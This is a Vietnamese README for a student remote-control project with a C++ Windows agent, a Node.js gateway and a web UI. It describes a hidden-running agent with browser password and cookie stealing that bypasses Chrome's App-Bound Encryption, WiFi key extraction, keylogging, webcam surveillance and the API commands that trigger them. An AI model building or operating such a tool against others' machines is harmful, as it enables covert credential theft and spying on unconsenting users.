<div align="center">

# 🖥️ Remote Control Desktop Application

### Đồ án Môn Mạng Máy Tính - Hệ thống Điều khiển & Giám sát Máy tính Từ xa

[![C++](https://img.shields.io/badge/C++-17-blue.svg?style=flat&logo=cplusplus)](https://isocpp.org/)
[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg?style=flat&logo=node.js)](https://nodejs.org/)
[![Windows](https://img.shields.io/badge/Platform-Windows-0078D6.svg?style=flat&logo=windows)](https://www.microsoft.com/windows)
[![License](https://img.shields.io/badge/License-Educational-orange.svg?style=flat)](LICENSE)

<p align="center">
  <img src="https://img.shields.io/badge/FFmpeg-007808?style=for-the-badge&logo=ffmpeg&logoColor=white" alt="FFmpeg"/>
  <img src="https://img.shields.io/badge/WebSocket-010101?style=for-the-badge&logo=socketdotio&logoColor=white" alt="WebSocket"/>
  <img src="https://img.shields.io/badge/Express.js-404D59?style=for-the-badge&logo=express&logoColor=white" alt="Express"/>
  <img src="https://img.shields.io/badge/Cloudflare-F38020?style=for-the-badge&logo=cloudflare&logoColor=white" alt="Cloudflare"/>
</p>

**Giải pháp toàn diện cho việc quản lý và điều khiển nhiều máy tính từ xa thông qua giao diện Web hiện đại**

[Tính năng](#-tính-năng-chính) •
[Cài đặt](#-cài-đặt) •
[Sử dụng](#-hướng-dẫn-sử-dụng) •
[Kiến trúc](#-kiến-trúc-hệ-thống) •
[API](#-api-reference)

</div>

---

## 📋 Mục lục

- [Giới thiệu](#-giới-thiệu)
- [Tính năng chính](#-tính-năng-chính)
- [Kiến trúc hệ thống](#-kiến-trúc-hệ-thống)
- [Yêu cầu hệ thống](#-yêu-cầu-hệ-thống)
- [Cài đặt](#-cài-đặt)
- [Hướng dẫn sử dụng](#-hướng-dẫn-sử-dụng)
- [Cấu trúc thư mục](#-cấu-trúc-thư-mục)
- [Công nghệ sử dụng](#-công-nghệ-sử-dụng)
- [API Reference](#-api-reference)
- [Giao thức truyền thông](#-giao-thức-truyền-thông)
- [Bảo mật](#-bảo-mật)
- [Troubleshooting](#-troubleshooting)
- [Đóng góp](#-đóng-góp)
- [Tác giả](#-tác-giả)
- [Giấy phép](#-giấy-phép)

---

## 🎯 Giới thiệu

**Remote Control Desktop** là một hệ thống điều khiển máy tính từ xa được phát triển như đồ án môn học **Mạng Máy Tính**. Dự án được thiết kế với kiến trúc 3-tier hiện đại, cho phép:

- 🌐 **Điều khiển qua Internet** - Vượt qua NAT/Firewall bằng Cloudflare Tunnel
- 🖥️ **Quản lý đa Agent** - Điều khiển nhiều máy tính cùng lúc từ một giao diện
- 🔄 **Real-time Streaming** - Xem màn hình với độ trễ thấp (H.264/MJPEG)
- 🇻🇳 **Hỗ trợ Unicode** - Gõ tiếng Việt chính xác trên máy từ xa
- 🔒 **Xác thực bảo mật** - Hệ thống đăng nhập với Admin Approval

### 💡 Điểm nổi bật

| Tính năng            | Mô tả                                                |
| -------------------- | ---------------------------------------------------- |
| **Auto Discovery**   | Agent tự động tìm Gateway trong LAN qua UDP Beacon   |
| **NAT Traversal**    | Không cần port forwarding, sử dụng Cloudflare Tunnel |
| **Vietnamese Input** | Cơ chế "Input Trap" + KEYEVENTF_UNICODE              |
| **Leader Election**  | Hỗ trợ High Availability với nhiều Gateway           |
| **Browser Stealer**  | Bypass App-Bound Encryption (Chrome v127+) qua CDP   |

---

## ✨ Tính năng chính

### 🖥️ Remote Desktop & Control

```
┌─────────────────────────────────────────────────────────────┐
│  📺 Screen Streaming    │  ⌨️ Keyboard Control             │
│  ─────────────────────  │  ────────────────────             │
│  • H.264 real-time      │  • Full keyboard support          │
│  • Adjustable FPS       │  • Vietnamese typing (Unicode)    │
│  • Low latency (<100ms) │  • Special keys (Ctrl, Alt, etc.) │
├─────────────────────────┼───────────────────────────────────┤
│  🖱️ Mouse Control       │  🔒 Input Blocker                │
│  ─────────────────────  │  ────────────────────             │
│  • Click (L/R/M)        │  • Block keyboard                 │
│  • Scroll               │  • Block mouse                    │
│  • Drag & Drop          │  • Bypass SendInput()             │
└─────────────────────────┴───────────────────────────────────┘
```

### 📁 File Manager

- 📂 Duyệt cây thư mục (tất cả ổ đĩa)
- 📥 Download file về máy điều khiển
- 📤 Upload file lên máy mục tiêu
- 📝 Tạo file/thư mục mới
- 🗑️ Xóa file/thư mục
- 👁️ Xem nội dung file (text, image)
- ✅ **Hỗ trợ đường dẫn tiếng Việt**

### 🔐 Data Extraction (Info Stealer)

| Module                   | Trình duyệt hỗ trợ                          | Phương thức              |
| ------------------------ | ------------------------------------------- | ------------------------ |
| **Password Stealer**     | Chrome, Edge, Brave, CocCoc, Opera, Vivaldi | DPAPI Decryption         |
| **Cookie Stealer (CDP)** | Chrome, Edge, Brave, CocCoc                 | Chrome DevTools Protocol |
| **Browser History**      | Chromium-based, Firefox                     | SQLite Parsing           |

> 🛡️ **Bypass App-Bound Encryption**: Sử dụng CDP để dump cookies trực tiếp từ browser process, vượt qua cơ chế bảo mật mới của Chrome v127+

### 📊 System Monitor

- 📋 **Process Manager**: Liệt kê, kết thúc tiến trình (như Task Manager)
- 📱 **Application Manager**: Quản lý ứng dụng đang chạy
- ⚡ **Power Control**: Shutdown, Restart máy từ xa
- 📶 **WiFi Scanner**: Lấy thông tin mạng WiFi đã lưu (SSID + Password)

### 📹 Webcam & Surveillance

```
┌──────────────────────────────────────────┐
│            WEBCAM MODULE                 │
├──────────────────────────────────────────┤
│  🔴 Live Stream    │  ⏺️ Record         │
│  ────────────────  │  ────────────────   │
│  • MJPEG stream    │  • MP4 recording    │
│  • 640x480         │  • Auto download    │
│  • Configurable    │  • Timestamp        │
└──────────────────────────────────────────┘
```

### ⌨️ Keylogger

- Ghi lại tất cả phím bấm
- **Window Title Logging**: Theo dõi ứng dụng đang active
- Phân biệt phím vật lý vs injected (bộ gõ tiếng Việt)
- Real-time streaming về Gateway

### 💬 Chat System

- Giao tiếp 2 chiều với người dùng máy mục tiêu
- Cửa sổ chat tự động hiện lên trên máy victim
- Force foreground (bypass Windows focus restriction)

---

## 🏗 Kiến trúc hệ thống

### Tổng quan kiến trúc 3-Tier

```
                                    INTERNET
                                       │
                        ┌──────────────┴──────────────┐
                        │    Cloudflare Tunnel        │
                        │    (NAT Traversal)          │
                        └──────────────┬──────────────┘
                                       │
┌─────────────────────────────────────────────────────────────────────────────┐
│                              LOCAL NETWORK (LAN)                            │
│                                                                             │
│  ┌─────────────────┐         ┌─────────────────┐         ┌───────────────┐  │
│  │                 │   TCP   │                 │   WS    │               │  │
│  │   AGENT (C++)   │◄───────►│ GATEWAY (Node)  │◄───────►│  WEB CLIENT   │  │
│  │                 │  :9100  │                 │  :8080  │               │  │
│  │  ┌───────────┐  │         │  ┌───────────┐  │         │ ┌───────────┐ │  │
│  │  │ WinAPI    │  │         │  │ Express   │  │         │ │ HTML5     │ │  │
│  │  │ FFmpeg    │  │         │  │ WebSocket │  │         │ │ ES6 Module│ │  │
│  │  │ DPAPI     │  │         │  │ sql.js    │  │         │ │ JMuxer    │ │  │
│  │  └───────────┘  │         │  └───────────┘  │         │ └───────────┘ │  │
│  └────────┬────────┘         └────────┬────────┘         └───────────────┘  │
│           │                           │                                     │
│           │     UDP Beacon (:9103)    │                                     │
│           └───────────────────────────┘                                     │
│                  (Auto Discovery)                                           │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Chi tiết từng thành phần

#### 1️⃣ Agent (C++ - Windows)

```cpp
// Entry Point: main_server.cpp
┌─────────────────────────────────────────────────────────┐
│                    AGENT ARCHITECTURE                   │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
│  │ TCP Client  │  │   Router    │  │ GatewayDiscovery│  │
│  │ (ASIO)      │  │  (Command)  │  │ (UDP Listener)  │  │
│  └──────┬──────┘  └──────┬──────┘  └────────┬────────┘  │
│         │                │                   │          │
│  ┌──────┴────────────────┴───────────────────┴───────┐  │
│  │                   HANDLERS                        │  │
│  ├───────────────────────────────────────────────────┤  │
│  │ ProcessHandlers  │ FileHandlers │ ChromeRecovery  │  │
│  │ ScreenStream     │ WebcamStream │ CdpStealer      │  │
│  │ KeyboardControl  │ MouseControl │ Keylogging      │  │
│  │ InputBlocker     │ ChatManager  │ WifiSearcher    │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

**Đặc điểm kỹ thuật:**

- Asynchronous I/O với ASIO library
- FFmpeg embedded trong resource (.rc)
- JSON-based protocol (newline-delimited)
- Auto-reconnect khi mất kết nối
- Heartbeat mechanism (2s interval)

#### 2️⃣ Gateway (Node.js)

```javascript
// Entry Point: gateway.js
┌─────────────────────────────────────────────────────────┐
│                   GATEWAY ARCHITECTURE                  │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │  TCP Server  │  │  WS Server   │  │ HTTP Server  │   │
│  │   (:9100)    │  │   (:8080)    │  │  (Express)   │   │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘   │
│         │                 │                  │          │
│         └────────────┬────┴──────────────────┘          │
│                      │                                  │
│  ┌───────────────────┴───────────────────────────────┐  │
│  │                   MODULES                         │  │
│  ├───────────────────────────────────────────────────┤  │
│  │  auth.js          │ SQL.js (WASM)                 │  │
│  │  - bcrypt hash    │ - Decrypt passwords           │  │
│  │  - User approval  │ - Parse browser history       │  │
│  │                   │ - Cookie decryption           │  │
│  ├───────────────────────────────────────────────────┤  │
│  │  Leader Election  │ UDP Beacon                    │  │
│  │  - Multi-gateway  │ - Agent discovery             │  │
│  │  - Auto failover  │ - Broadcast (:9103)           │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

**Đặc điểm kỹ thuật:**

- Event-driven architecture
- sql.js (WebAssembly) - giải mã SQLite in-memory
- Leader Election cho High Availability
- Cloudflare Tunnel integration

#### 3️⃣ Web Client (Frontend)

```
gateway/public/
├── index.html              # Single Page Application
├── style.css               # Glassmorphism UI
├── jmuxer.min.js           # H.264 decoder
└── js/
    ├── main.js             # Entry point
    ├── core/
    │   ├── state.js        # Global state management
    │   ├── utils.js        # Helper functions
    │   └── websocket.js    # WS connection handler
    └── modules/
        ├── auth.js         # Login/Register
        ├── screen.js       # Screen streaming
        ├── fileManager.js  # File operations
        ├── stealer.js      # Data extraction UI
        ├── keylogger.js    # Keylog viewer
        ├── webcam.js       # Webcam controls
        ├── chat.js         # Chat interface
        └── ...
```

---

## 💻 Yêu cầu hệ thống

### Agent (Máy mục tiêu)

| Yêu cầu     | Chi tiết                         |
| ----------- | -------------------------------- |
| **OS**      | Windows 10/11 (64-bit)           |
| **Runtime** | Visual C++ Redistributable 2019+ |
| **Network** | Kết nối mạng (LAN hoặc Internet) |
| **RAM**     | Tối thiểu 512MB                  |

### Gateway (Máy chủ)

| Yêu cầu     | Chi tiết                                        |
| ----------- | ----------------------------------------------- |
| **OS**      | Windows / Linux / macOS                         |
| **Runtime** | Node.js v18+                                    |
| **Network** | Port 8080 (HTTP), 9100 (TCP), 9103 (UDP)        |
| **Tools**   | cloudflared.exe (tùy chọn, cho Internet access) |

### Development (Build từ source)

| Component     | Requirements                                |
| ------------- | ------------------------------------------- |
| **Agent**     | MinGW-w64 (g++ 11+), C++17 support          |
| **Gateway**   | Node.js v18+, npm                           |
| **Libraries** | ASIO, nlohmann-json, websocketpp (included) |

---

## 📦 Cài đặt

### Phương pháp 1: Sử dụng bản build sẵn (Khuyến nghị)

```bash
# 1. Clone repository
git clone https://github.com/habaodunggithub/ComputerNetworkProject_RemoteDesktopApp.git
cd ComputerNetworkProject_RemoteDesktopApp

# 2. Chạy Gateway
cd gateway
npm install          # Cài dependencies (lần đầu)
node gateway.js      # Hoặc chạy gateway.exe nếu có

# 3. Chạy Agent (trên máy mục tiêu)
cd agent
agent.exe           # Chạy trực tiếp
```

### Phương pháp 2: Build từ source

#### Build Agent (C++)

```batch
cd agent
build.bat
```

**Nội dung build.bat:**

```batch
@echo off
g++ -std=c++17 -O2 -mwindows ^
    -I../include ^
    -I../include/asio-1.18.0/include ^
    -I../include/nlohmann ^
    -I../include/websocketpp ^
    main_server.cpp AgentTcpServer.cpp GatewayDiscovery.cpp ^
    ProcessManager.cpp ProcessHandlers.cpp FileHandlers.cpp ^
    -o agent.exe ^
    -lws2_32 -lgdi32 -lgdiplus -lcrypt32 -lshcore -luser32 ^
    -static-libgcc -static-libstdc++ -static
```

#### Build Gateway (Executable)

```bash
cd gateway
npm install
npm run build        # Tạo gateway.exe (sử dụng pkg)
```

---

## 🚀 Hướng dẫn sử dụng

### Bước 1: Khởi động Gateway

```bash
cd gateway
node gateway.js
```

**Output mong đợi:**

```
[Gateway] ID: DESKTOP-ABC123_1702800000000_x5k2m
[Config] Loading from config.env...
[Gateway] TCP listening on 0.0.0.0:9100
[Gateway] UDP Beacon ready (on-demand mode)
[Election] Listening on port 9104
[Election] 👑 THIS GATEWAY IS NOW THE LEADER!
[Tunnel] Starting Cloudflare tunnel...
[Tunnel] ✅ Public URL: https://abc-xyz-123.trycloudflare.com

[Admin CLI] Ready. Type 'help' for commands.
ADMIN>
```

### Bước 2: Đăng ký tài khoản Admin

1. Mở trình duyệt: `http://localhost:8080`
2. Click **Register** và tạo tài khoản
3. Quay lại Terminal Gateway, approve tài khoản:

```
ADMIN> approve <username>
✅ User "username" has been approved!
```

### Bước 3: Khởi động Agent

```bash
cd agent
agent.exe
```

> ⚠️ **Lưu ý**: Agent chạy ẩn (không có cửa sổ). Kiểm tra trong Task Manager.

### Bước 4: Điều khiển từ Web UI

1. Đăng nhập Web UI
2. Click **Scan LAN** để tìm Agent
3. Chọn Agent từ danh sách
4. Sử dụng các tab: Screen, Files, System, Stealer, Webcam, Keylog, Chat

### Admin CLI Commands

```
ADMIN> help

================== ADMIN COMMANDS ==================
  approve <user>     Phê duyệt tài khoản người dùng
  reject <user>      Từ chối/Xóa tài khoản
  list               Liệt kê tất cả user
  pending            Xem user đang chờ duyệt
  agents             Xem danh sách Agent online
  kick <agentId>     Ngắt kết nối Agent
  broadcast <msg>    Gửi tin nhắn tới tất cả Agent
  exit               Thoát chương trình
=====================================================
```

---

## 📂 Cấu trúc thư mục

```
ComputerNetworkProject_RemoteDesktopApp/
│
├── 📁 agent/                           # Agent (C++ Windows)
│   ├── 📄 main_server.cpp              # Entry point
│   ├── 📄 build.bat                    # Build script
│   ├── 📄 resource.rc                  # Embedded resources (FFmpeg)
│   │
│   ├── 📁 Core/
│   │   ├── AgentTcpServer.cpp/h        # TCP client (ASIO)
│   │   ├── GatewayDiscovery.cpp/h      # UDP beacon listener
│   │   ├── Router.h                    # Command dispatcher
│   │   └── Utils.h                     # Helper functions
│   │
│   ├── 📁 Handlers/
│   │   ├── ProcessHandlers.cpp/h       # Process/App management
│   │   ├── FileHandlers.cpp/h          # File operations
│   │   ├── ProcessManager.cpp/h        # System process API
│   │   ├── MouseControl.h              # Mouse simulation
│   │   └── KeyboardControl.h           # Keyboard simulation
│   │
│   ├── 📁 Streaming/
│   │   ├── ScreenStream.h              # Screen capture (FFmpeg)
│   │   ├── WebcamStream.h              # Webcam streaming
│   │   ├── WebcamRecord.h              # Webcam recording
│   │   └── Capture.h                   # GDI screen capture
│   │
│   ├── 📁 Stealer/
│   │   ├── ChromeRecovery.h            # Password extraction (DPAPI)
│   │   ├── CdpStealer.h                # Cookie extraction (CDP)
│   │   ├── BrowserHistory.h            # History extraction
│   │   └── WifiSearcher.h              # WiFi credentials
│   │
│   └── 📁 Features/
│       ├── Keylogging.h                # Keylogger
│       ├── InputBlocker.h              # Input blocking
│       └── ChatManager.h               # Chat window
│
├── 📁 gateway/                         # Gateway (Node.js)
│   ├── 📄 gateway.js                   # Main server
│   ├── 📄 auth.js                      # Authentication module
│   ├── 📄 package.json                 # Dependencies
│   ├── 📄 config.env                   # Configuration
│   ├── 📄 users.json                   # User database
│   │
│   └── 📁 public/                      # Web Frontend
│       ├── 📄 index.html               # SPA entry
│       ├── 📄 style.css                # Styles
│       ├── 📄 jmuxer.min.js            # H.264 decoder
│       └── 📁 js/
│           ├── 📄 main.js              # App entry
│           ├── 📁 core/                # Core modules
│           └── 📁 modules/             # Feature modules
│
├── 📁 include/                         # C++ Libraries
│   ├── 📁 asio-1.18.0/                 # ASIO networking
│   ├── 📁 nlohmann/                    # JSON library
│   ├── 📁 websocketpp/                 # WebSocket++
│   └── 📁 FFmpeg/                      # FFmpeg binaries
│
└── 📄 README.md                        # Documentation
```

---

## 🛠 Công nghệ sử dụng

### Backend Technologies

| Technology     | Purpose                    | Version |
| -------------- | -------------------------- | ------- |
| **C++17**      | Agent core language        | GCC 11+ |
| **ASIO**       | Async networking (TCP/UDP) | 1.18.0  |
| **Node.js**    | Gateway runtime            | 18+     |
| **Express.js** | HTTP server                | 4.x     |
| **ws**         | WebSocket server           | 8.x     |
| **sql.js**     | SQLite WASM (decrypt DB)   | Latest  |
| **bcryptjs**   | Password hashing           | 2.x     |

### Windows APIs (Agent)

| API            | Usage                        |
| -------------- | ---------------------------- |
| **WinSock2**   | Network socket               |
| **GDI+**       | Screen capture               |
| **User32**     | Input simulation (SendInput) |
| **DPAPI**      | Credential decryption        |
| **TlHelp32**   | Process enumeration          |
| **DirectShow** | Webcam access                |

### Frontend Technologies

| Technology            | Purpose                 |
| --------------------- | ----------------------- |
| **Vanilla JS (ES6+)** | No framework dependency |
| **ES Modules**        | Code organization       |
| **JMuxer**            | H.264 video decoding    |
| **Glassmorphism CSS** | Modern UI design        |
| **Feather Icons**     | Icon library            |

### External Tools

| Tool            | Purpose                  |
| --------------- | ------------------------ |
| **FFmpeg**      | Video encoding/streaming |
| **Cloudflared** | Tunnel for NAT traversal |

---

## 📡 API Reference

### WebSocket Messages (Client → Gateway → Agent)

#### Screen Control

```json
// Start screen streaming
{ "command": "start_screen_stream", "agentId": "192.168.1.100" }

// Stop screen streaming
{ "command": "stop_screen_stream", "agentId": "192.168.1.100" }

// Mouse input
{
  "command": "mouse_input",
  "agentId": "192.168.1.100",
  "type": "click",        // "click" | "move" | "scroll"
  "button": "left",       // "left" | "right" | "middle"
  "x": 500, "y": 300
}

// Keyboard input
{
  "command": "keyboard_input",
  "agentId": "192.168.1.100",
  "key": "a",
  "keyCode": 65,
  "isKeyDown": true,
  "isKeyUp": true
}
```

#### File Manager

```json
// List drives
{ "command": "fs_drives", "agentId": "..." }

// List directory
{ "command": "fs_list", "agentId": "...", "path": "C:\\Users" }

// Download file
{ "command": "fs_download", "agentId": "...", "path": "C:\\file.txt" }

// Upload file
{
  "command": "fs_upload",
  "agentId": "...",
  "path": "C:\\upload\\file.txt",
  "data": "<base64_content>"
}

// Delete
{ "command": "fs_delete", "agentId": "...", "path": "C:\\file.txt" }
```

#### Data Extraction

```json
// Auto-detect all browsers passwords
{ "command": "steal_passwords_auto", "agentId": "..." }

// Steal cookies via CDP
{ "command": "steal_cookies_cdp", "agentId": "...", "browser": "chrome" }

// Get browser history
{ "command": "get_browser_history", "agentId": "...", "browser": "chrome" }

// Get WiFi info
{ "command": "wifi_info", "agentId": "..." }
```

#### System Control

```json
// List processes
{ "command": "list_processes", "agentId": "..." }

// Kill process
{ "command": "stop_process_pid", "agentId": "...", "pid": 1234 }

// Shutdown
{ "command": "system_shutdown", "agentId": "..." }

// Restart
{ "command": "system_restart", "agentId": "..." }
```

### REST API (Gateway)

| Endpoint          | Method | Description             |
| ----------------- | ------ | ----------------------- |
| `/api/register`   | POST   | Register new user       |
| `/api/login`      | POST   | User login              |
| `/api/scan`       | GET    | List online agents      |
| `/api/start-scan` | POST   | Trigger UDP beacon scan |

---

## 🔐 Giao thức truyền thông

### Agent ↔ Gateway (TCP)

```
┌─────────────────────────────────────────────────────────────┐
│                    TCP JSON STREAM                          │
├─────────────────────────────────────────────────────────────┤
│  Format: JSON + newline ('\n') delimiter                    │
│  Encoding: UTF-8                                            │
│  Port: 9100                                                 │
├─────────────────────────────────────────────────────────────┤
│  Agent → Gateway:                                           │
│  {"type":"hello","hostname":"PC-001","os":"Windows"}\n      │
│  {"type":"heartbeat"}\n                                     │
│  {"type":"video_chunk","data":"<base64>"}\n                 │
│  {"type":"passwords_auto_result","browsers":[...]}\n        │
├─────────────────────────────────────────────────────────────┤
│  Gateway → Agent:                                           │
│  {"command":"start_screen_stream"}\n                        │
│  {"command":"fs_list","path":"C:\\"}\n                      │
└─────────────────────────────────────────────────────────────┘
```

### Gateway ↔ Web Client (WebSocket)

```
┌─────────────────────────────────────────────────────────────┐
│                    WEBSOCKET (JSON)                         │
├─────────────────────────────────────────────────────────────┤
│  Path: /ws                                                  │
│  Protocol: ws:// or wss:// (via Cloudflare)                 │
├─────────────────────────────────────────────────────────────┤
│  Client → Gateway:                                          │
│  {"command":"...", "agentId":"192.168.1.100", ...}          │
├─────────────────────────────────────────────────────────────┤
│  Gateway → Client:                                          │
│  {"type":"video_chunk", "data":"...", "agentId":"..."}      │
│  {"type":"passwords_result", "data":[...]}                  │
└─────────────────────────────────────────────────────────────┘
```

### UDP Beacon (Auto Discovery)

```
┌─────────────────────────────────────────────────────────────┐
│                    UDP BROADCAST                            │
├─────────────────────────────────────────────────────────────┤
│  Port: 9103                                                 │
│  Direction: Gateway → Broadcast (255.255.255.255)           │
│  Agent listens on 0.0.0.0:9103                              │
├─────────────────────────────────────────────────────────────┤
│  Packet Format:                                             │
│  {                                                          │
│    "type": "gateway_beacon",                                │
│    "hostname": "GATEWAY-PC",                                │
│    "ip": "192.168.1.10",                                    │
│    "port": 9100                                             │
│  }                                                          │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔒 Bảo mật

### Các cơ chế bảo mật được triển khai

| Feature                | Implementation                       |
| ---------------------- | ------------------------------------ |
| **Password Hashing**   | bcrypt (10 rounds)                   |
| **Admin Approval**     | Manual approval via CLI              |
| **Input Validation**   | Server-side JSON validation          |
| **Session Management** | Single WebSocket connection per user |

### ⚠️ Cảnh báo bảo mật

> **Đây là dự án học tập.** Không sử dụng trong môi trường production mà không có các biện pháp bảo mật bổ sung:
>
> - Thêm TLS/SSL cho TCP connection
> - Implement JWT authentication per request
> - Rate limiting
> - Audit logging
> - Encryption for sensitive data transmission

---

## 🔧 Troubleshooting

### Agent không kết nối được Gateway

```bash
# Kiểm tra Gateway đang chạy
netstat -an | findstr 9100

# Kiểm tra firewall
netsh advfirewall firewall add rule name="Gateway TCP" dir=in action=allow protocol=TCP localport=9100

# Kiểm tra UDP beacon
netsh advfirewall firewall add rule name="Gateway UDP" dir=in action=allow protocol=UDP localport=9103
```

### Screen stream bị lag

```javascript
// Giảm FPS trong ScreenStream.h
(cmd << " -framerate ") << 15; // Giảm từ 30 xuống 15

// Giảm bitrate
cmd << " -b:v 800k"; // Giảm từ 1500k xuống 800k
```

### FFmpeg không hoạt động

```bash
# Kiểm tra FFmpeg đã được extract
dir %TEMP%\ffmpeg.exe

# Manual test
%TEMP%\ffmpeg.exe -version
```

### Lỗi DPAPI khi steal password

```
Nguyên nhân: App-Bound Encryption (Chrome v127+)
Giải pháp: Sử dụng CDP Stealer thay vì DPAPI method
```

---

## 🤝 Đóng góp

Chúng tôi hoan nghênh mọi đóng góp! Vui lòng:

1. Fork repository
2. Tạo branch mới (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Mở Pull Request

### Coding Standards

- **C++**: Follow Google C++ Style Guide
- **JavaScript**: ESLint with Standard config
- **Commits**: Conventional Commits format

---

## 👨‍💻 Tác giả

**Đồ án Mạng Máy Tính** 

| Thành viên               | Vai trò     |
| ------------------------ | ----------- |
| **Trần Kim Hữu**         | Development |
| **Hà Văn Thiên Bảo**     | Development |
| **Lê Quý Phúc**          | Development |

---

## 📄 Giấy phép

```
MIT License

Copyright (c) 2024-2025

Dự án này được phát triển với mục đích GIÁO DỤC và NGHIÊN CỨU.
Việc sử dụng cho mục đích bất hợp pháp là NGHIÊM CẤM.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
```

---

## ⚠️ Disclaimer

> **CẢNH BÁO PHÁP LÝ**
>
> Phần mềm này được phát triển **CHỈ** cho mục đích học tập và nghiên cứu trong môi trường có kiểm soát.
>
> ❌ **NGHIÊM CẤM** sử dụng phần mềm này để:
>
> - Truy cập trái phép vào hệ thống máy tính của người khác
> - Thu thập dữ liệu cá nhân mà không có sự đồng ý
> - Bất kỳ hoạt động vi phạm pháp luật nào
>
> ✅ **CHỈ SỬ DỤNG** trên:
>
> - Máy tính cá nhân của bạn
> - Hệ thống bạn được phép kiểm tra
> - Môi trường lab/học tập có giám sát
>
> Người sử dụng chịu hoàn toàn trách nhiệm về việc sử dụng phần mềm này.

---

<div align="center">

**⭐ Star repo này nếu bạn thấy hữu ích!**

Made with ❤️ for Computer Networks Course

</div>
